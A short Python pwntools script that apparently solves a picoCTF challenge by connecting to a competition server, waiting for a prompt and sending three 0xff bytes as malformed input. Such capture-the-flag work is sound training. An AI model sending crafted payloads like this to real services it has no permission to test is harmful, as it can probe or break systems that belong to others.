from pwn import *

#p = process(["python","app(7).py"])
p = remote("lonely-island.picoctf.net", 52857)
p.recvuntil(b"==> ")
p.sendline(b"\xff\xff\xff")
print(p.recvline().decode())
